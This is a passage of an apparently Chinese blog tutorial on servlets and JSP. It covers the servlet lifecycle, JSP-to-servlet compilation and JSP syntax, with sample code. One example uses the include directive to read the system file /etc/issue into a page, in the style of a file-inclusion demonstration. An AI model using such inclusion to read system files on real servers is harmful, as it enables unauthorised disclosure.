<p>此时无论访问 <code>/main</code> 或是 <code>Main</code> 都可以达到访问名为 <code>main</code> 的 <code>servlet</code> 目的。</p>
<p>另外，如果跟进 <code>@WebServlet</code> 可以发现实际上 <code>urlPatterns</code> 和 <code>value</code> 是同一个功能👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230842249.png" alt="image-20220223084224126"></p>
<p>所以上述表达式可以写成👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;,&quot;/Main&quot;&#125;)</span></span><br></pre></td></tr></table></figure>
<p>但 <code>value</code> 和 <code>urlPatterns</code> 不能同时存在。</p>
<p>比方说这里写入 <code>@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;&#125;)</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jspstudy3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== Main() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== init() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== doGet() ==&quot;</span>);</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;doGet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当访问 <code>http://localhost:9058/jspstudy3_war_exploded/main</code> 并刷新两次得到的结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230934536.png" alt="image-20220223093437449"></p>
<p>可见在 <code>Main</code> 这个 <code>servlet</code> 中方法的调用顺序为 <code>构造方法</code> =&gt; <code>init()</code> =&gt; <code>doGet()</code> ，显然 <code>init</code> 方法是在 <code>servlet</code> 被实例化完毕后才由 <code>servlet</code> 容器调用。</p>
<h4 id="servlet和tomcat过程">- servlet和tomcat过程 -</h4>
<p>① <code>客户端</code> 向 <code>tomcat</code> 服务器(<code>servlet</code> 容器)的 <code>serlvet</code> (通过 <code>&lt;serlvet-mapping&gt;</code> 将请求URL对应到相应 <code>serlvet</code>类)发送 <code>http</code> 请求</p>
<p>② <code>servlet</code> 容器将从 <code>客户端</code> 发来的 <code>http</code> 请求封装成 <code>ServletRequest</code> 对象</p>
<p>③  <code>servlet</code> 容器实例化一个 <code>ServletResponse</code> 对象用作响应</p>
<p>④ <code>servlet</code> 容器实例化相应 <code>servlet</code> 类(如果该 <code>servlet</code> 未在服务器启动时被实例化)，然后将 <code>ServletRequest</code> 以及 <code>ServletResponse</code> 对象作为参数传给 <code>servlet</code> 类实例对象</p>
<p>⑤ <code>servlet</code> 容器将 <code>servlet</code> 类实例对象对相应内容的处理结果返回给客户端</p>
<h3 id="jsp">- jsp -</h3>
<p><code>jsp</code> 全称为 <code>java server pages</code> ，旨在使用 <code>jsp</code> 标签在静态的 <code>html</code> 页面中插入 <code>java</code> 代码(通常为 <code>&lt;% [java代码] %&gt;</code> 格式)，以便实现在静态模板页面中动态生成部分内容。</p>
<h4 id="jsp和serlvet联系">- jsp和serlvet联系 -</h4>
<p>简单来说，<code>jsp</code> 实际上是一种 <code>servlet</code> ，只是表型形式不同。当客户端访问 <code>jsp</code> 时，服务器会将对应的 <code>jsp</code> 编译成 <code>class</code> 文件并将结果输出到浏览器。</p>
<p>比如写以下 <code>jsp</code> 文件👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231002302.png" alt="image-20220223100203201"></p>
<p>由于这里我的 <code>CATALINA_BASE</code> 值为 <code>C:\Users\22929\AppData\Local\JetBrains\IntelliJIdea2021.3\tomcat\f798d3f2-b185-4339-9a97-cdc26ef39996</code> 故在保持服务器运行的情况下可以在 <code>C:\Users\22929\AppData\Local\JetBrains\IntelliJIdea2021.3\tomcat\f798d3f2-b185-4339-9a97-cdc26ef39996\work\Catalina\localhost\jspstudy3_war_exploded\org\apache\jsp</code> 目录中拿到有关 <code>jsp</code> 的 <code>class</code> 和 <code>java</code>文件👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231005152.png" alt="image-20220223100524064"></p>
<p>如果打开 <code>test_jsp.java</code> 文件，可以看到 <code>test_jsp</code> 类继承了 <code>org.apache.jasper.runtime.HttpJspBase</code> 类👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231023539.png" alt="image-20220223102358463"></p>
<p>使用 <code>jd-gui</code> 打开 <code>tomcat</code> 目录下的 <code>lib\jasper.jar</code> 文件可以得到 <code>org.apache.jasper.runtime.HttpJspBase</code> 类的代码👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231028081.png" alt="image-20220223102823939"></p>
<p>可见是继承了 <code>HttpServlet</code> 类，而 <code>HttpServlet</code> 类最终通过继承 <code>GenericServlet</code> 类实现 <code>serlvet</code> 方法，因此可以说 <code>jsp</code> 实际上是一个 <code>serlvet</code> 。</p>
<p>如果继续看这个 <code>HttpJspBase</code> 类还可以发现，其 <code>init</code> ，<code>service</code> ，以及 <code>destroy</code> 方法分别存在 <code>_jspInit</code> ，<code>_jspservice</code> 和 <code>_jspDestory</code> 方法的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231033959.png" alt="image-20220223103358754"></p>
<p>回来看 <code>test_jsp.java</code> 文件，存在上述的方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231034745.png" alt="image-20220223103441670"></p>
<p>其中在 <code>_jspService</code> 方法中可以很明显的看到对相应内容的相关写入👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231037493.png" alt="image-20220223103715324"></p>
<p>因此可知在 <code>jsp</code> 写的任何 <code>html</code> 内容都会被先转换为 <code>servlet</code> ，然后用 <code>out.write</code> 来写入响应内容，而 <code>java</code> 代码则会在这个 <code>test_jsp</code> 类的 <code>_jspService</code> 方法中执行。</p>
<p>同时 <code>jsp</code> 也可以看作是一个类的内部，像是 <code>test_jsp</code> 类的属性或是方法都可以在这个 <code>jsp</code> 里面直接使用的。</p>
<h4 id="jsp和servlet区别">- jsp和servlet区别 -</h4>
<p>由于 <code>jsp</code> 最终的归宿是转换成 <code>servlet</code> ，区别也就只能从其他方面来区分，比如在多层应用中 <code>jsp</code> 一般是用来做表现层，而<code>servlet</code> 用作控制层；<code>jsp</code> 是先部署后再编译，<code>servlet</code> 一般是先编译后部署，这样 如果 <code>jsp</code> 代码发生了改动，<code>tomcat</code> 就会在下次客户端请求时重新编译生成 <code>class</code> 文件，就不需要重启 <code>tomcat</code> 服务器。</p>
<h4 id="jsp和tomcat过程">- jsp和tomcat过程 -</h4>
<p>① <code>客户端</code> 向 <code>tomcat</code> 服务器上的 <code>jsp</code> 发送 <code>http</code> 请求</p>
<p>② <code>tomcat</code> 容器将从 <code>客户端</code> 发来的 <code>http</code> 请求封装成 <code>ServletRequest</code> 对象</p>
<p>③  <code>tomcat</code> 容器实例化一个 <code>ServletResponse</code> 对象用作响应</p>
<p>④  <code>tomcat</code> 服务器将对应的 <code>jsp</code> 文件转换成相应 <code>java</code> 格式的 <code>servlet</code> 文件</p>
<p>⑤ <code>tomcat</code> 服务器将相应 <code>java</code> 格式的 <code>servlet</code> 文件编译成对应 <code>class</code> 格式的 <code>servlet</code> 文件(此时就接着有关 <code>servlet</code> 的处理部分了)</p>
<p>⑥ <code>tomcat</code> 服务器实例化对应的 <code>servlet</code> 类(如果该 <code>servlet</code> 类未被实例化)，将 <code>ServletRequest</code> 以及 <code>ServletResponse</code> 对象作为参数传给 <code>servlet</code> 类实例对象</p>
<p>⑦ <code>tomcat</code> 服务器将 <code>servlet</code> 类实例对象对相应内容的处理结果返回给客户端</p>
<h4 id="语法">- 语法 -</h4>
<p><code>JSP脚本</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% [java代码段] %&gt;</span><br></pre></td></tr></table></figure>
<p>等价 <code>XML</code> 语句👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span>   </span><br><span class="line">  [java代码段]</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以在 <code>JSP脚本</code> 中写入任意 <code>java</code> 代码。</p>
<p><code>JSP声明</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! [java声明内容] %&gt;</span><br></pre></td></tr></table></figure>
<p>等价 <code>XML</code> 语句👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;   </span><br><span class="line">  [java声明内容]</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure>
<p>声明内容可以是对一个或多个变量，方法定义或重写的语句。这些声明的内容在经过解析后会放到后面转换的 <code>java</code> 文件中，比如在 <code>test.jsp</code> 中有以下声明语句👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>那么其对应的 <code>test_jsp.java</code> 文件的 <code>test_jsp</code> 类的开头就会多出以上内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231212701.png" alt="image-20220223121212647"></p>
<p>可以看作是直接写入对应的类。</p>
<p><code>JSP表达式</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= [表达式] %&gt;</span><br></pre></td></tr></table></figure>
<p>等价 <code>XML</code> 语句👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;   </span><br><span class="line">  [表达式]</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure>
<p>实际上 <code>JSP表达式</code> 等价于 <code>out.write([表达式])</code> 。另外，无法用 <code>;</code> 结尾。</p>
<p><code>JSP注释</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- [注释内容] --%&gt;</span><br></pre></td></tr></table></figure>
<p>这个 <code>JSP注释</code> 可以注释任何里面的东西，例如在调试的时候可以直接用 <code>&lt;%-- [注释内容] --%&gt;</code> 格式去让某段 <code>html</code> 内容消失。</p>
<h4 id="指令-directive">- 指令(directive) -</h4>
<p><code>jsp</code> 的指令用来设置整个页面相关的属性，指令的语法格式👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ [设置内容] %&gt;</span><br></pre></td></tr></table></figure>
<p>有三种指令标签(摘自 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSP语法</a> )👇</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>指令</strong></th>
<th style="text-align:left"><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&lt;%@ page … %&gt;</td>
<td style="text-align:left">定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</td>
</tr>
<tr>
<td style="text-align:left">&lt;%@ include … %&gt;</td>
<td style="text-align:left">包含其他文件</td>
</tr>
<tr>
<td style="text-align:left">&lt;%@ taglib … %&gt;</td>
<td style="text-align:left">引入标签库的定义，可以是自定义标签</td>
</tr>
</tbody>
</table>
<h5 id="page">- page -</h5>
<p><code>page</code> 指令用来定义页面依赖性，比如脚本语言、error页面和缓存需求等，拥有以下的属性名称👇</p>
<ul>
<li><code>import</code></li>
<li><code>contentType</code></li>
<li><code>pageEncoding</code></li>
<li><code>language</code></li>
<li><code>errorPage</code></li>
<li><code>isErrorPage</code></li>
<li><code>info</code></li>
<li><code>session</code></li>
<li><code>......</code></li>
</ul>
<p>例如👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>以上 <code>import</code> 的作用即是在 <code>jsp</code> 页面中引入需要用到的类或包。</p>
<p>比较常见的👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;utf-8&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>即规定该页面的文档类型和所使用编码都为 <code>utf-8</code> ，其次对该页面使用 <code>java</code> 语言进行解释。</p>
<p>还有👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page session=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>即是关闭了 <code>jsp</code> 中的内置 <code>session</code> 对象。</p>
<p>和错误页面相关的👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page errorPage=<span class="string">&quot;error.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>将当前页面的错误页面设为 <code>error.jsp</code> ，即如果在当前页面有错误发生则使用 <code>error.jsp</code> 页面的内容。</p>
<p>错误页面上的👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isErrorPage=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>这样就可以在错误页面中直接使用 <code>Exception</code> 类的 <code>exception</code> 对象。</p>
<p>如果想声明 <code>jsp</code> 的信息可以用以下👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page info=<span class="string">&quot;123&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>这样可以从 <code>Servlet.getServletInfo()</code> 中获取到。</p>
<h5 id="include">- include -</h5>
<p>这个指令有点像 <code>php</code> 中的 <code>include</code> ，用以包含一些 <code>jsp</code> 或是 <code>html</code> 文件的内容，但并没有文件格式的限制，比如👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">&quot;/etc/issue&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>可以将 <code>/etc/issue</code> 文件的内容读取出来。</p>
<h5 id="taglib">- taglib -</h5>
<p>用以引入标签库，如以 <code>JSTL</code> 标签库为例👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>其中 <code>prefix</code> 为标签前缀，<code>uri</code> 为类库的地址。</p>
<h4 id="行为-action">- 行为(action) -</h4>
<p>这个其实就是 <code>jsp</code> 中内置的 <code>标签</code> ，使用 <code>XML</code> 语法结构。比如上面语法中所述的 <code>XML</code> 等价语句其实就是 <code>jsp</code> 的行为。</p>
<p>行为的语法格式👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:[行为名称] [属性名]=[值]&gt;</span><br></pre></td></tr></table></figure>
<p>比如一些行为(摘自 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSP语法</a> )👇</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>语法</strong></th>
<th style="text-align:left"><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">jsp:include</td>
<td style="text-align:left">用于在当前页面中包含静态或动态资源</td>
</tr>
<tr>
<td style="text-align:left">jsp:useBean</td>
<td style="text-align:left">寻找和初始化一个JavaBean组件</td>
</tr>
<tr>
<td style="text-align:left">jsp:setProperty</td>
<td style="text-align:left">设置 JavaBean组件的值</td>
</tr>
<tr>
<td style="text-align:left">jsp:getProperty</td>
<td style="text-align:left">将 JavaBean组件的值插入到 output中</td>
</tr>
<tr>
<td style="text-align:left">jsp:forward</td>
<td style="text-align:left">从一个JSP文件向另一个文件传递一个包含用户请求的request对象</td>
</tr>
<tr>
<td style="text-align:left">jsp:plugin</td>
<td style="text-align:left">用于在生成的HTML页面中包含Applet和JavaBean对象</td>
</tr>
<tr>
<td style="text-align:left">jsp:element</td>
<td style="text-align:left">动态创建一个XML元素</td>
</tr>
<tr>
<td style="text-align:left">jsp:attribute</td>
<td style="text-align:left">定义动态创建的XML元素的属性</td>
</tr>
<tr>
<td style="text-align:left">jsp:body</td>
<td style="text-align:left">定义动态创建的XML元素的主体</td>
</tr>
<tr>
<td style="text-align:left">jsp:text</td>
<td style="text-align:left">用于封装模板数据</td>
</tr>
</tbody>
</table>
<h5 id="include-2">- include -</h5>
<p>和上面指令的 <code>include</code> 在包含形如 <code>jsp</code> 文件时所进行操作不同，行为中的 <code>include</code> 是先将所要包含的 <code>jsp</code> 文件编译执行了，然后将执行的结果内容包含进来；而指令的 <code>include</code> 则将所要包含的 <code>jsp</code> 文件的内容连同自己的内容合并了再编译执行。</p>
<p>比如在 <code>test.jsp</code> 页面中👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;index.jsp&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>相当于将 <code>index.jsp</code> 页面加载完毕后的内容拼接到 <code>test.jsp</code> 页面对应 <code>&lt;jsp:include&gt;</code> 的位置。</p>
<h5 id="bean">- bean -</h5>
<p>有关 <code>javaBean</code> 的行为，包括 <code>useBean</code> ，<code>setProperty</code> 和 <code>getProperty</code> 。比如构造以下的 <code>bean</code> 类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> person;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonBean</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> String text = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PersonBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getText</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.text;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setText</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.text = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将其打包成 <code>jar</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231817008.png" alt="image-20220223181751792"></p>
<p>一个简单的示例👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:useBean id=<span class="string">&quot;person&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;person.PersonBean&quot;</span> scope=<span class="string">&quot;page&quot;</span> &gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;dq&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:setProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;test&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:useBean&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;name&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;age&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;jsp:getProperty name=<span class="string">&quot;person&quot;</span> property=<span class="string">&quot;text&quot;</span>/&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>其中👇</p>
<ul>
<li>
<p><code>&lt;jsp:setProperty&gt;</code> 用以指定对应名称的 <code>bean</code> 所使用的 <code>bean</code> 类，以及作用域，比如这里的意思是作用域为当前页面，名称为 <code>person</code> ，使用 <code>person.PersonBean</code> 类的 <code>bean</code></p>
</li>
<li>
<p><code>&lt;jsp:setProperty&gt;</code> 用以对指定名称的 <code>bean</code> 中对应属性赋值</p>
</li>
<li>
<p><code>&lt;jsp:getProperty&gt;</code> 用以获取指定名称的 <code>bean</code> 中指定属性的值</p>
</li>
</ul>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231824104.png" alt="image-20220223182424982"></p>
<p>当然 <code>&lt;jsp:useBean&gt;</code> 实质是在指定的作用域内实例化对应的类，而这个类不一定得是真正的 <code>bean</code> 类，只要是可序列化的都行。</p>
<h5 id="xml">- xml -</h5>
<p>其实就是用 <code>element</code> ，<code>attribute</code> ，<code>body</code> 和 <code>text</code> 构建 <code>xml</code> 内容，比如👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">jsp:element</span> <span class="attr">name</span>=<span class="string">&quot;e1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a1&quot;</span> <span class="attr">trim</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        a1_value</span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a2&quot;</span> <span class="attr">trim</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        a2_value</span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp:body</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jsp:element</span> <span class="attr">name</span>=<span class="string">&quot;e2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">jsp:attribute</span> <span class="attr">name</span>=<span class="string">&quot;a3&quot;</span>&gt;</span></span><br><span class="line">                a3_value</span><br><span class="line">            <span class="tag">&lt;/<span class="name">jsp:attribute</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">jsp:body</span>&gt;</span>test<span class="tag">&lt;/<span class="name">jsp:body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jsp:element</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp:body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:element</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
